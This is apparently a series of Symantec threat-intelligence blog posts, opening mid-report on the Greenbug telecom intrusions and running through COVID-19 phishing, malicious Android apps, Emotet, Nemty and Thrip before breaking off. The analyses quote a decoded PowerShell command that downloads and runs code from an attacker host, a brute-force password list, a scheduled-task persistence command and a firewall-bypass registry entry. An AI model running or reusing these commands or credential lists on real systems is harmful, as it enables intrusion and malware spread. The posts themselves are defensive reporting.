credentials may be used to access organizational resources such as SQL servers. Further activity was seen on February 12 and February 14. On February 12, the attackers returned and executed a tool:pls.exe. An hour later, the attackers bound cmd.exe to a listening port usingnetcatwith the following command: The same command was issued again about 20 minutes later. Two days later, at 7.29am local-time, the attackers returned and connected to the listening port, launching cmd.exe. They issued the following commands: The next day (February 15) the attackers returned to the command prompt and issued a command to add a user and then checked that the user was added. No further activity was observed until March 4, when a PowerShell command was launched at 6.30pm local time. A WMI command was also observed being executed and used to search for a specific account. Shortly after this, the well-known credential-stealing tool Mimikatz was executed from %USERPROFILE%\\documents\\x64. On March 11, the attackers attempted to connect to a database server via PowerShell, presumably using credentials they had stolen. The attackers also used an SQL command to retrieve the version information of the database server, presumably to test the credentials and connectivity. Further activity was seen in April. On April 8, suspicious PowerShell commands were observed attempting to download tools from a remote host. That was the only activity seen on April 8, then on April 13 PowerShell was launched and the following commands were observed being executed: Next, PowerShell was used to connect to a database server and check the version information, likely to confirm working credentials. This is similar to the previous PowerShell command observed with the exception of a different database server IP address. Finally, the attackers used PowerShell to view the current ARP table (IPs and hostname of machines that have recently been communicated with) via an arp -a command. That is the last activity we observed on this machine. A number of suspicious files were found on this machine (see IoCs). The files include the Covenant tool and Mimikatz, as already mentioned, as well as Cobalt Strike, an off-the-shelf tool that can be used to load shellcode onto victim machines, and multiple webshells. We saw suspicious activity on various machines on this same victim’s network. The attackers targeted several other users within the organization with the same file, proposal_pakistan110.chm:error.html, which was opened by an archiver tool and, in one instance, via the Microsoft Edge browser. Following this, we observed a backdoor being executed on the machine, alongside additional tools downloaded to the %APPDATA% directory from the attacker’s infrastructure. On one machine in this organization, we saw some suspicious PowerShell commands executed on December 9. One of the files executed by PowerShell, comms.exe, is Plink. A second similar command used the Bitvise command line tunneling client. Both tools are used to set up a tunnel to attacker-controlled infrastructure to allow Terminal Services and RDP access to an internal machine. Tools such as Plink and Bitvise are legitimate sysadmin tools, but have been seen being exploited by malicious actors before, includingby Iranian actors earlier this year. Plink was also seen on a second machine in this organization, which appears to have been compromised from November 2019 up to April 2020. The first suspicious activity on this machine was seen on November 13, when PowerShell Remoting was enabled on the machine to allow it to receive PowerShell commands. A PowerShell command was used to download a file from attacker controlled infrastructure and launch it with a specific argument. The argument decodes to /server=vsiegru.com /id=41. Shortly after this the Plink utility was executed to establish a connection to the victim network. A second PowerShell command was then executed as follows: The encoded argument decodes to the following: The attackers were then seen adding a user to the administrators group on this machine. Two further PowerShell commands were executed on the machine about a week later, on November 16. The first decodes to the following: iex ((New-Object Net. WebClient). DownloadString('http://apps[.]vvvnews.com:8080/Default.htt')) As the attackers have set up a tunnel, using the Plink tool, all connections appear to be routing to internal machine IP addresses. This was likely done as a means to evade detection. Greenbug’s activity in this campaign seems to make it clear that its main focus with these victims is to steal credentials, and to maintain a low profile on the victim’s network so the attackers can remain on it for a substantial period of time. This is typical of the activity we have seen in Greenbug victims in the past, with maintaining persistence on a victim network appearing to be one of the group’s primary goals. Greenbug has also been observed targeting telecoms companies in this same region in previous attack campaigns. The setting up of tunnels shows how important keeping a low-profile is for this group. Its focus on stealing credentials, and on establishing connections with database servers, shows that it is aiming to achieve a high level of access to a victim’s network - access that if exploited could cause havoc on a compromised network very quickly. This level of access, if leveraged by actors using disruptive malware or ransomware, could shut down an organization’s entire network very quickly. Previous victims of Greenbug have included organizations in the aviation, government, investment, and education sectors, as well as the telecoms sector, with attacks against telecoms organizations in the Middle East in 2017. In 2019, we observed 18 nation-state backed groups targeting the telecoms sector worldwide, so it seems to be an area of interest for sophisticated actors recently. It is probably not too hard to understand why the telecommunications industry, made up of phone providers and internet service providers (ISPs), is attractive to APT groups, whose main motivation is most often intelligence gathering. The access to calls, communications logs, and messages offered by telecoms companies makes them hugely valuable targets for these attackers. We can only speculate about Greenbug’s motives for targeting these specific telecoms companies, but it is clear that comprehensive and persistent access to victim networks remains the key priority for this group.

    "text": "This is a follow-up to our previous blog onCOVID-19 related spam campaigns. This blog will share some insight on the latest wave of COVID-19 themed spam campaigns and how Email Threat Isolation (ETI) from Symantec stops these emails from accomplishing their goals. Symantec has continued to observe numerous malicious email campaigns taking advantage of the global panic surrounding the coronavirus outbreak. While we previously discussed malspam (malware bearing) emails, now a wave of text-based spam campaigns have emerged. These emails do not contain any malicious attachments and instead rely on what is written in the email to trick users into handing over information or money. According to Symantec telemetry, as well as COVID-19 related phishing and malspam campaigns, spammers are increasingly using text-based campaigns. One reason for this is that it is comparatively cheaper and easier than phishing and malspam campaigns as there is no need for compromised domains or malware. The most abused vanity TLDs used in these campaigns are .xyz, .top, and .site. These text-based spam campaigns include the following types of scams: One of the best solutions or defense mechanisms provided by Symantec to its customers is Email Threat Isolation (ETI). ETItechnology checks emails and attachments for phishing URLs or malicious content hosted on them. This technology de-risks the threat scenario by providing an extra layer of protection that allows users to safely browse unknown or shady websites, without risk of malware infection or credential theft. ETI is offered within the Symantec Email Security.cloud and Symantec Messaging Gateway solutions, and also as a standalone product that works with email security solutions from other vendors. Phishing emails masquerading as COVID-19 funding reports are being spread in spam campaigns. These emails try their best to trick recipients into clicking on links that lead to phishing web pages designed to steal credentials. Threat actors have designed convincing email templates that appear to come from reputable file-sharing/storage services and use them for their phishing campaigns. An example of this can be seen in Figure 2. The email content is kept short and mentions that a confidential document has been shared with the email recipient. In order to view the “Confidentiality.pdf” file, the user needs to click on “OPEN FILE”, beneath which a recently registered domain is used to form a phishing URL: https://[REMOVED]covid.com/ The phishing URL opens as a legitimate looking login page requesting the user to enter credentials. In Figure 3, Email Threat Isolation (ETI) alerts the user that the web page is potentially unsafe to visit and automatically enables the protected view with read-only mode. This helps to safeguard the user’s credentials or confidential information from being compromised. In Figure 4, a bogus email template is used to tell the recipient that a COVID-19 report file has been shared with them. When the “View” button is clicked, the user is brought to a phishing web page constructed with the help of a compromised domain: https://[REMOVED]/ssl/?@= These emails claim to come from small to medium-sized manufacturing firms, offering for sale a variety of medical equipment. The email templates used are kept simple and direct. As with many of these scam emails, there are often grammar, spelling, and punctuation errors present. In Figure 5, the threat actor provides a list of medical equipment specifying the type of respirators and masks available for purchase. The email also mentions that special chartered shipping services are available for VIP clients and provides shipping details. In Figure 6, the threat actor poses as a supplier from China keen to ship various types of face masks to different parts of the world with abundant stock ready to ship. This is another variation of the infamous advance fee scam. These emails are generally kept short and try to attract victims by offering generous monetary donations. In Figure 7, a generous wealthy couple is supposedly donating money for the Covid-19 relief effort. The email asks the recipient to provide personal details to a lawyer in order to claim the money. The email shown in Figure 8 is supposedly from the United Nations, in relation to COVID-19 relief. The email asks the recipient to verify their email address, which will then allow the sender to begin a conversation with the user and begin their scam. The subject line of this email starts with “Re:”, a tactic used to trick the recipient into thinking the message is a continuation of previous correspondence. These emails are themed as notification emails notifying the user they have been selected in a lottery to receive coronavirus compensation. In Figure 9, one of these emails asks the user to provide personal information before applying for their share of $1,000,000. These emails leverage cryptocurrencies and QR codes. The email shown in Figure 10 presents the recipient with a Bitcoin wallet address and a QR code to supposedly donate money or “food gift cards” to help with the coronavirus pandemic relief effort. Scanning the QR code brings up the same Bitcoin wallet listed in the email text. The email also lists an email address where all gift cards should be forwarded to. In Figure 11, the threat actor poses as a doctor and urges recipients to donate funds towards the COVID-19 Solidarity Response Fund, which will supposedly help with the production of a COVID-19 vaccine. Donations are requested to be paid to the provided Bitcoin wallet address. Snowshoe campaigns continue to be a firm favorite for spammers. These campaigns appear with heavy randomization in header fields to avoid detection. Snowshoe campaigns come in large batches in a short period of time. Along with heavy randomization of email features, these runs also use a myriad of topics and themes. In addition, these emails are distributed with a variety of originating IP addresses, domains with different gTLDs, and heavy obfuscation to avoid detection. In Figures 12 and 13, threat actors have made use of current affairs and designed their email templates accordingly. These include themes like “Elon Musk Reveals How to Profit from Coronavirus” and the promotion of a “Touch Free Body Thermometer.” Ultimately, the URLs hyperlinked beneath the words “Register now!” and “Browse Thermometers” contain newly registered spam domains. Predictive filtering systems focused on URL and other email features are deployed in timely intervals to catch changes in the rapidly changing email threat landscape. With the help of predictive filtering systems, threats that use email as a medium are filtered or blocked before they cause menace. This approach has also proved beneficial to detect the variation in these types of attacks and filter them down in terms of volume or scale. At Symantec, response teams strive hard to protect our valuable customers by introducing new defense mechanisms against such challenging attacks. An array of defense mechanisms is deployed in different layers at .cloud and Symantec Mail gateway level to block similar attacks.

    "text": "Cyber criminals are rushing to take advantage of the COVID-19 pandemic and in recent weeks Symantec has observed dozens of new malicious email campaigns attempting to leverage public fears about the virus. The threat actors behind these campaigns have employed a range of tactics in a bid to evade detection, such as using a variety of email templates along with heavy randomization of subject lines, “From” addresses, IP addresses, and URL domains. When analyzing email campaigns from the month of March, the first wave was dominated by phishing and malspam (malware bearing) emails. However, as the month moved onwards, snowshoe spam took over as the most common form of campaign, accounting for more than 40 percent of all emails blocked by Symantec. This was following by phishing (30 percent), malspam (18 percent), and scams (9 percent). There was a sharp uptick in the number of malicious emails blocked by Symantec on March 16, with a surge of spam runs focused around selling face masks, medical equipment, immunity oil, and other products related to COVID-19 virus outbreak. Interestingly, this increase closely corresponded with the increase in the number of COVID-19 infections recorded in in Europe and the U. S. This email is crafted to appear as a message from the U. S. Centers for Disease Control and Prevention (CDC). It explains that the CDC is closely monitoring the coronavirus outbreak and has established an Incident Management System to coordinate a domestic and international public health response. The recipient is then urged to click on a link that purports to lead to a list of new cases around their city. While the domain used in text appears to be “cdcinfo.gov”, hovering the cursor over the link will reveal the real, malicious URL the link leads to: When clicked, it routes to: In this spam run, the threat actor has made use of compromised domains to construct phishing URLs and has used a particular pattern – “/owa/owa.php?e=” in the URI path. The phishing URL opens a credential stealing webpage. Another phishing campaign observed by Symantec used quite a short template to masquerade as a legitimate business email. This email urges the recipient to review coronavirus funding proposals, with “Access to View File” hyperlinking to a legitimate online document editor/viewer hosting the phishing content. The URL given in the email is as follows: When opened, the document asks the viewer to enter their credentials. The use of legitimate file storage /sharing services and online document editors/viewers has increased rapidly from 2019 onwards, with threat actors leveraging these services because most of them are free. One example of a COVID-19 themed scam campaign seen by Symantec is an email pretending to come from the World Health Organization (WHO) and appears to be a classic example of advance fee fraud. In this case, the email claims that the WHO has approved of $550,000 in funding to be distributed to 50 people in the U. S. to be used for the prevention of outbreaks of the disease. In order to receive the funds, the recipient is asked to get in touch via email with an agency in order to negotiate the transfer. In most cases, if the victim does respond, the scammers will then attempt to trick them into paying a fee in order to “release” the funds. Another scam campaign features an attempt at extortion. The sender claims to be a neighbor of the recipient and says that they have been diagnosed with COVID-19 and are expecting to die. They then threaten to infect the recipient’s home unless they pay them. A Bitcoin wallet address is provided for the recipient to pay the extortion money. The Coronavirus outbreak has also prompted a surge in demand for masks and other protective clothing. One spam campaign Symantec observed claimed to come from a surgical mask supplier in China. The sender says that COVID-19 is almost gone in their country and they can now start to sell to other countries. One of the biggest snowshoe campaigns relating to the outbreak outlandishly offered “immunity oil” which could protect people from the virus. Snowshoe campaigns are bit different than the other spam campaigns. Snowshoe distributors use a variety of originating IP addresses, domains and obfuscation in the email template in order to avoid detection. One of the peculiar characteristics of snowshoe spam runs is that they involve massive amounts of emails in short intervals of time. Threat actors also use heavy randomization in header fields in order to avoid detection. In this example, the sender claims that a particular brand of oil can help to protect people from COVID-19 infection. This statement is supported by a news article which the threat actor has provided as an image in the email. A URL embedded within this image leads to spam content hosted on cloud storage – something a growing number of spammers are doing. Threat actors also register domains on different gTLDs, which are useful to send snowshoe runs in short intervals. These recently registered domains are used both in header fields and URLs. The most abused gTLDs observed in these snowshoe campaigns are:.biz, .cf, .info, .online, .xyz. Symantec provides leading predictive filtering system focused on URLs and other email features to detect and block changes in the rapidly changing email threat landscape. This technique has also proved beneficial to detect the variation in these types of attacks. The WHO also featured in a recent malspam campaign seen by Symantec. The email mentions that new research on COVID-19 has proven to be effective and the WHO has thus decided to share a .pdf file containing information on safety measures and preventive vaccination. The email comes with an attachment named “Covid19_UPDATE.rtf.zip” Inside this compressed file is a link (LNK file) with .rtf file extension which points to powershell.exe with obfuscated data as parameters. As soon as the obfuscated content is decrypted, it constructs a URL using “TinyURL” service. This URL downloads cookies to After this, it tries to visit the following URL: On execution, these files can be expected to download malicious content on user’s computer. While there is always a need to protect your organization against malicious emails, at a time of fear and doubt, this need becomes more pronounced. Predictive filtering systems focused on URL and other email features are deployed in timely intervals to catch changes in the rapidly changing email threat landscape. With the help of predictive filtering system, threats that use email as a medium are filtered or blocked before they cause menace. This approach has also proved beneficial to detect the variation in these types of attacks and filter them down in terms of volume or scale.

    "text": "On March 26, Symantec discovered 11 Android applications that were all made to appear like they were legitimate apps related to tracking cases in the Covid-19 pandemic, but which were in fact secretly downloading a malicious payload after installation. The coronavirus pandemic is the main news story all over the world right now, with hundreds of thousands of cases and thousands of deaths. These applications were created after March 20, a time when Covid-19 was spreading widely, particularly in Europe. From the apps’ user interface (UI)(see Figure 1)we can see these apps were targeting Italy, which has the most confirmed cases of Covid-19 in Europe, though it is now closely followed by Spain. However, even though it is clear the malicious apps were targeting Italy, we did also see them installed on devices in the U. S. and France as well. All 11 of the malicious apps we discovered were repacked versions of a legitimate app,SM_Covid19 app, which “assesses the risk of transmission of the virus by monitoring the number, duration and type of contacts [people have]”. The repacked apps kept many of the features of the original app, such as collecting location and device information for Covid-19 monitoring. However, we found that the repacked apps were also injected with Metasploit, which allows for a reverse TCP connection and for various commands to be executed. The attackers can retrieve the compromised device user’s file information, SMS messages, contacts and even take screenshots of what the device is displaying. The malware used also had a malicious module added that could download any payload from the attackers’ servers. This functionality means it would be possible for the attackers to perform the same attack on all users at the same time; it also means they could use all infected devices to create a botnet, potentially to do something such as perform a distributed denial of service (DDoS) attack or similar. The malicious apps’ ability to download any payload means they could in theory be used to infect a victim’s device with ransomware, infostealers, coinminers, or any other type of malware. After decrypting the app, we were able to find the IP address of the control server. After investigating the server address, we found that the server was also located in Italy. We also discovered that the attackers also used a second server IP [87.19.73.8] for attacks. This campaign shows that even at times of great global crisis attackers will try to take advantage of popular topics in an attempt to infect victims with malware, but there are some simple steps device users can take to help protect themselves from this type of activity. Always download and install applications from official websites and app stores only.

    "text": "The recent upsurge in tensions between the U. S. and Iran has led to fears about an increase in both the frequency and aggressiveness of Iranian-sponsored cyber attacks. Iran has an extensive track record in this sphere, with government-backed cyber threat groups conducting numerous offensive cyber operations in recent years, including a number of highly destructive wiper attacks. While an uptick in such attacks is not a certainty, it is a distinct possibility and organizations should exercise extreme vigilance. The capabilities of Iranian actors have evolved rapidly in recent years, from quick and relatively simple destructive attacks, such as distributed denial‐of‐service (DDoS) attacks or website defacements, to an increased focus on network compromises where the actors maintain a persistent foothold and obfuscate their presence to make attribution difficult. Iranian groups have also increasingly targeted critical infrastructure including energy and telecommunications companies. Attackers associated with Iran have periodically carried out highly destructive disk-wiping attacks against targets in the Middle East. Historically, these attacks tend to coincide with periods of heightened instability in the region. Most of these destructive attacks have involved the Shamoon disk wiper (W32. Disttrack). Shamoonfirst emerged in 2012, when it was used in attacks against the Saudi energy sector. Itreappeared again in late 2016, when a slightly modified version (W32. Disttrack. B)was used in another wave of attacks against Saudi Arabia. A third wave of attacksoccurred in December 2018, when Shamoon was once again deployed against a range of targets in the Middle East. Unlike previous Shamoon attacks, these attacks involved a second piece of wiping malware (Trojan. Filerase). This malware deleted and overwrote files on the infected computer. Shamoon itself would meanwhile erase the master boot record (MBR) of the computer, rendering it unusable. Recent months have also seen the emergence of two new wipers, which appear to be evolutions of the original Shamoon wiper. The first, known as ZeroCleare (Trojan. Zerocleare) appeared in June and July of 2019, while in January 2020, theNational Cybersecurity Authority of Saudi Arabia released a reportabout a wiper malware they called Dustman. Dustman is a further evolution of ZeroCleare, where the authors optimized functionality into a single file instead of the way it worked in the June/July campaigns. While destructive attacks are an obvious source of concern, potential targets should be aware that the evidence available to date suggests that the Shamoon attackers may not have compromised their victims’ networks themselves. In the aftermath of the 2016 Shamoon attacks, Symantec found evidence that the Iran-linkedGreenbugandTimberwormespionage groups may have provided access to the victims’ networks. The 2018 attackshad a tentative link to the Iranian Elfin group(aka APT33), with one victim in Saudi Arabia having been compromised by the group shortly before Shamoon struck. With this in mind, any organization that finds indicators of compromise (IOCs) related to any Iran-linked espionage group on their network should exercise extreme vigilance. While destructive attacks remain a relative rarity, a prior intrusion does appear to be a necessary precursor. Aside from the aforementioned groups, other Iran-linked groups that are highly active at present includeChafer, Crambus (aka OilRig), andSeedworm. Given the recent history of attacks, it is evident that Iranian-sponsored groups consider destruction of equipment as an acceptable form of damage to targets. However, to date these incidents have only targeted Middle Eastern entities. Iranian actors have not yet shown an appetite for conducting similar attacks against organizations further afield. Considering the tense geopolitical climate in 2020 and based on previous Iranian activity, we believe cyber attacks originating from Iran or Iranian proxies would be (in order of descending probability): While Symantec has yet to see any evidence of a notable uptick in activity, this should not be misinterpreted, since planned operations could take some time to prepare and execute. Organizations associated with the U. S. and its allies are an obvious target. While Iranian actors have, to date, heavily focused on organizations in the Middle East, attacks against the U. S. should not be ruled out, particularly considering the heightened state of tensions at present. However, organizations based in the Middle East likely remain most at risk, given that Iranian groups know this region best and may already have ongoing compromises. Destructive attacks, such as those involving disk wipers, usually require some prior compromise of the organization’s network. This may mean that any potential destructive attacks could be focused on the Middle East, particularly if the attackers are under time pressure to retaliate.

    "text": "At the end of 2018, it appeared that the Emotet group had gone dark when its malware campaigns greatly reduced in size. There was another major decline in the summer months of 2019; however, in September 2019, there was an increase in activity (over 100 percent) with Emotet’s (Trojan. Emotet) command and control (C&C) servers delivering a new wave of malicious binaries. As the months went on, we noticed that the volume of malware sent from the C&C servers was increasing. At times, over 1 million hits per day were being blocked by Symantec’s various protection services. Customers using Symantec Messaging Gateway (SMG) or the Email Security.cloud service have even greater protection as these malicious emails are blocked before reaching the end user. Our telemetry showed a blocking volume increase with these technologies. However, because these technologies were able to stop the attacks successfully at an earlier stage in the attack chain, it caused a reduction in the need to use endpoint protection for blocking. Products like Symantec SMG and Email Security.cloud provide a way to block malware at the cloud level before it reaches your network. Emotetstarted out as a banking Trojanfocused on stealing user information by sniffing networks. Over the years, Emotet has evolved by constantly updating its codebase and sophisticated evasion techniques. The Emotet criminals are known to run their botnet as a Malware-as-a-Service (MaaS), enabling other threat actors to easily distribute various malicious payloads such as AZORult (Infostealer. Rultazo), IcedID (Trojan. IcedID), TrickBot (Trojan. Trickybot) etc. The types of emails being used in these attacks come in various forms. The first is an email with a link to an Office document file that contains a malicious macro, which then downloads the malicious executable payload (Figure 2). The Email . Cloud product contains the Link Following service that follows any links it finds in emails to determine if they are spam or malware, which is just one of the benefits of using Email Security.cloud. The second type of email we observed is one with the Office document attached to the email (Figure 3). Document SHA256: 4e35e66d898a56184f42674c5bc41d4abe219beabeafb4cbdddf8ae974326839 Emotet uses social engineering techniques in its spam campaigns, tricking users into opening the file and running the macro to infect victims’ computers. As seen in Figure 4, the document uses a fake warning message asking users to “Enable Editing” in an attempt to trick the user into executing the malicious macro script. The document summary information shows the document was created just a few hours prior to the attack. When the document is opened a malicious macro downloads Emotet’s main module. The macro, which is highly obfuscated in an attempt to bypass traditional antivirus signatures, uses Windows Management Instrumentation (WMI ) classes, such as winmgmts:Win32_Process, to call powershell.exe. Emotet is known to hide its payloads in a document’s objects and streams and this variant is no different. Figure 7 shows a Base64-encoded malicious payload hidden in document streams. The macro uses an obfuscated PowerShell command to download the Emotet binaries. By using legitimateliving-off-the-landbinaries (LoLBins), such as windows PowerShell and WMI, the macro can evade detection by security software. The Emotet module downloads additional payloads to the user’s computer. In Figure 11, we can see that the Emotet module has downloaded the file scanscan.exe to the %AppData% folder. This is the final TrickBot payload, which will conduct further destructive activities. Emotet will create a persistent entry in the registry to make sure that TrickBot runs every time the user logs on.

We have seen multiple similar variants successfully blocked by our heuristics engine scanner over the past few months. We have blocked a high volume of malicious emails with various social engineering subject lines targeting various financial institutions. Some of the subject lines contained the following keywords: These runs were successfully blocked with heuristics that were created as far back as 2016 for our Email Security.cloud security scanner. The advanced scanner is methodical in detecting obfuscation techniques used to hide malicious payloads. Email Security.cloud customers are protected from malware campaigns such as the one discussed in this blog.

    "text": "“Living-off-the-land” tactics—where attackers take advantage of native tools and services already present on targeted systems—have been used by both targeted attack groups and common cyber criminal gangs for some time now. Symantec has previously published research that gives a general overview ofliving-off-the-land tactics and fileless attack techniques; however, ournew researchprovides updated statistics on the dual-use tools utilized in these attacks—with a focus on PowerShell and Windows Management Instrumentation (WMI)—and how they are currently being used by different attack groups. The most frequently executed tools observed by Symantec in Q1 2019 were net.exe, PowerShell, the certification utility, the task scheduler, and the WMI command line (WMIC). However, only a fraction of the overall usage of these tools was malicious. The context and execution sequence must be considered when determining if usage is malicious or benign. To do this, we extract execution patterns from our data with the help of advanced machine learning, and the data is then analyzed by our AI-based Targeted Attack Analytics (TAA) component. We also looked at more than 500,000 dual-use tool detections from the beginning of September 2019, which were either used to download or copy payloads to target computers. This revealed that WMI, the command line tool, and PowerShell were most frequently used for malicious purposes, accounting for 89 percent of all dual-use tools used as downloaders. In September 2019 alone, Symantec blocked more than 480,000 malicious PowerShell scripts on endpoints. This number, while significant and steadily increasing, still only represents 0.8 percent of all observed PowerShell usage. Symantec data from between September 2018 and September 2019 shows a 406 percent increase in the number of blocked PowerShell scripts, and this number is likely to increase even further. We also analyzed 100,000 PowerShell command line arguments, keywords used, and frequency of occurrence of parent processes, to discover which were the most frequently used during attacks. Full details of this can be seen inthe white paper. Interestingly, 48 percent of all malicious PowerShell commands were started through WMI. The tool is commonly used to spread PowerShell scripts laterally in internal networks. A typical process for executing a command on a remote system using WMI involves the remote system spawning an instance of wmiprvse.exe and then running the command which, as mentioned, is often a PowerShell command. This means that wmiprvse.exe is present in most process parent chains for malicious PowerShell scripts. Targeted attack groups have been using living-off-the-land tactics for a long time, with almost all active groups having been spotted using dual-use tools at some point. Using these methods allows the attackers to hide their activity among legitimate administration work, and makes attribution difficult as there are no binaries to be analyzed and fewer indicators of compromise (IoC). Looking at six active targeted attack groups and the living-off-the-land tools they use reveals that PowerShell is by far the most popular, with all six utilizing it in their attacks. In all, around 77 percent of targeted attack incidents made use of PowerShell. The credential-dumping tool Mimikatz, used by four of the groups, is the second most popular tool.

    "text": "The Nemty ransomware (Ransom. Nemty), initially detected in August 2019, has increased its reach by partnering up with the Trik botnet (Trojan. Wortrik), which now delivers Nemty to compromised computers. Trik, also known as Phorpiex, has been around for approximately 10 years. In its early days, the malware self-propagated via removable USB drives, Windows Live Messenger, or Skype private messages. The criminals behind the botnet use the infected computers to send email spam and have been observed pushing out a wide range of malware families, with Nemty being the latest to join the list. Nemty, meanwhile, first appeared on the scene in mid-August 2019. While the malware first appeared to be a run-of-the-mill ransomware, a constant series of changes to the threat made it apparent that it was very mucha work in progressand something to be taken seriously. In the past, Nemty has been observed being spread via the RIG exploit kit, as well as via malicious spam campaigns targeting users in Korea and China, where the malware is attached inside an archive. Our data shows that most Nemty infections are found in Korea and China. In early October, we noticed that Trik had begun distributing Nemty as a payload, adding another channel for the ransomware’s delivery. We observed a recent version of Trik delivering a tiny component that uses the Server Message Block (SMB) protocol and a list of hardcoded credentials to try to connect to remote computers with port 139 open. First, the SMB component creates the following registry entry: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\\\"[PATH OF THE ORIGINAL FILE]\" = \"[PATH OF THE ORIGINAL FILE]:*:Enabled: Windows NetBIOS Driver\" Trik then checks if the filewinsvcs.txtis present or not in the%AppData%directory on the compromised computer. This file is present if the computer has previously been infected with Trik. To find targets, the SMB componentgenerates random IP addresses then tries to connect to them on port 139. From analysing the malware’s code, we can see that it skips the routine if the created IP address is a local one (Figure 4). The malware can infect public IP addresses with port 139 open that are using any of the common administrator usernames and passwords on its list. Usernames:Administrator, administrator, Admin, admin Passwords:123, 1234, 12345, 123456, 1234567, 12345678, 123456789, 1234567890, 123123, 12321, 123321, 123abc, 123qwe, 123asd, 1234abcd, 1234qwer, 1q2w3e, a1b2c3, administrator, Administrator, admin, Admin, admin123, Admin123, admin12345, Admin12345, administrator123, Ad ministrator123, nimda, qwewq, qweewq, qwerty, qweasd, asdsa, asddsa, asdzxc, asdfgh, qweasdzxc, q1w2e3, qazwsx, qazwsxedc, zxcxz, zxccxz, zxcvb, zxcvbn, passwd, password, Password, login, Login, pass, mypass, mypassword, adminadmin, root, rootroot, test, testtest, temp, temptemp, foofoo, foobar, default, password1, password12, password123, admin1, admin12, admin123, pass1, pass12, pass123, root123, abc123, abcde, abcabc, qwe123, test123, temp123, sample, example, internet, Internet If access is granted, the malware uses the SMB protocol to copy itself to the remote machine. It then uses the Windows Service Control Manager to start the SMB component’s process on the remote machine. The sample running on the remote machine also checks for the presence of winsvcs.txt, which again determines whether or not Nemty is downloaded and executed. Other researchers have provided a detailed analysis of Nemty 1.0. However, during our analysis of Nemty 1.6, we noted some key updates compared to 1.0, which are listed here: cmd.exe /c schtasks.exe /create /sc onstart /tn “NEMTY_<FILEID>_” /tr “C:\\Users\\user\\AdobeUpdate.exe” The developers behind the Nemty ransomware are constantly updating and improving its code, as well as its delivery methods, in an attempt to reach more victims. The Trik botnet, itself known foradapting to the latest trendsin order to stay relevant, makes a perfect partner in crime for Nemty.

    "text": "Since Symantecfirst exposed the Thrip group in 2018, the stealthy China-based espionage group has continued to mount attacks in South East Asia, hitting military organizations, satellite communications operators, and a diverse range of other targets in the region. Many of its recent attacks have involved a previously unseen backdoor known as Hannotog (Backdoor. Hannotog) and another backdoor known as Sagerunex (Backdoor. Sagerunex). Analysis of the latter has revealed close links to another long-established espionage group called Billbug (aka Lotus Blossom). In all likelihood, Thrip and Billbug now appear to be one and the same. Since we last published on Thrip in June 2018, the group has attacked at least 12 organizations, all located within South East Asia. Its targets have been located in Hong Kong, Macau, Indonesia, Malaysia, the Philippines, and Vietnam. The group has attacked a diverse range of targets over the past year, most notably military targets in two different countries. It has also attacked organizations in the maritime communications, media, and education sectors. Thrip has continued to target organizations in the satellite communications sector, with evidence of activity dating to as recently as July 2019. One of the most alarming discoveries we made in our original Thrip research was that the group had targeted a satellite communications operator and seemed to be interested in the operational side of the company, looking for and infecting computers running software that monitored and controlled satellites. Significantly, Thrip has continued to target organizations in the satellite communications sector, with evidence of activity dating to as recently as July 2019. Much of this recent activity was uncovered by Symantec following the discovery of a Thrip tool, a backdoor called Hannotog which appears to have been used since at least January 2017. It was first detected in an organization in Malaysia, where it triggered an alert for suspicious WMI activity with ourTargeted Attack Analytics (TAA)technology, available in Symantec Endpoint Detection and Response (EDR). TAA leverages artificial intelligence in order to comb through Symantec’s vast data and spot patterns associated with targeted attacks. It is capable of automatically flagging incidents that would otherwise have taken thousands of hours of analyst time to identify. TAA allowed us to uncover Hannotog and from there, our expert threat hunting team built out a profile of the adversary’s tools, tactics, and procedures. This allowed us to identify other organizations that have been compromised by Thrip, allowing us to build up a complete picture of the group’s most recent activities. Hannotog is a custom backdoor which provides the attackers with a persistent presence on the victim’s network. It has been used in conjunction with several other Thrip tools, including Sagerunex, another custom backdoor providing remote access to the attackers, and Catchamas (Infostealer. Catchamas), a custom Trojan deployed on selected computers of interest and designed to steal information. In addition to custom malware, Thrip has made extensive use of dual-use tools and living-off-the-land tactics. These include: Since Symantec first uncovered Thrip in 2018, we’ve found strong evidence linking it to the Billbug group. What ties the two groups together is the Sagerunex backdoor. This malware appears to be an evolution of an older Billbug tool known as Evora. By comparing strings and code flow between the two, we found that: Billbug is a long-established espionage group, active since at least January 2009. Similar to the Thrip sub-group, the wider Billbug group is known for specializing in operations against targets in South Asia. Billbug’s targets are usually compromised by either spear-phishing emails or watering hole attacks. The group’s spear-phishing attacks have tended to use exploits in Microsoft Office and PDF documents to drop its malware onto victims’ computers. To date, many of the group’s targets have been governments or military organizations. Thrip appears to have been undeterred by its exposure last year, continuing to mount espionage attacks against a wide range of targets in South East Asia. Its link to the Billbug group puts its activities into context and proves its attacks are part of a broader range of espionage activity heavily focused on (but not limited to) governments, armed forces, and communications providers. Symantec’s TAA was the catalyst for both our initial discovery of Thrip in 2018 and the discovery of new tools and victims in 2019. Without TAA’s artificial intelligence, it is quite likely that the group’s activities may have gone undetected for a lot longer. Symantec Endpoint Detection and Response (SEDR),which contains TAA technology, automatically detects Thrip-related activity. In addition to SEDR,Symantec’s Managed Endpoint Detection and Response (MEDR) serviceleverages automated attack hunting provided by analytics as well as Symantec analyst security expertise to remotely investigate and contain incursions by adversaries such as Thrip in Symantec customer networks. The following protections are also in place to protect customers against Thrip attacks: File-based protection Customers of theDeepSight Intelligence Managed Adversary and Threat Intelligence(MATI) service have received reports on Thrip and Billbug, which detail methods of detecting and thwarting activities of this group. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

    "text": "An email arrives in your inbox, with one of your old passwords in the Subject line. Your curiosity is piqued, and you click into the message, only to discover that someone has allegedly hacked your webcam and recorded you engaged in some intimate acts, and they are now threatening to send this recording to everyone in your contact list. However, if you send the anonymous blackmailer a few hundred dollars in bitcoins they promise that no one will see the embarrassing footage. This is a situation many people found themselves in over the last year, as we witnessed a revival and evolution in email extortion scams, which are exactly what they sound like: scam emails that attempt to extort cash from victims. These sorts of scams have been around for many years, but the scenario outlined above—often referred to as a \"sextortion\" scam—is one of the main types of extortion scams we have started seeing more frequently again since about mid-2018. When we look at the number of these kinds of scams that have been blocked by Symantec since the start of this year, we can see the trend is going upwards, with a spike visible during a two-week period in February especially notable. Between January 1 and May 29, 2019, just under 289 million of these types of emails were blocked by Symantec technologies. Just over 85 million of these emails (almost 30 percent) were blocked during this 17-day period in February when we saw a big spike in these types of scams. We 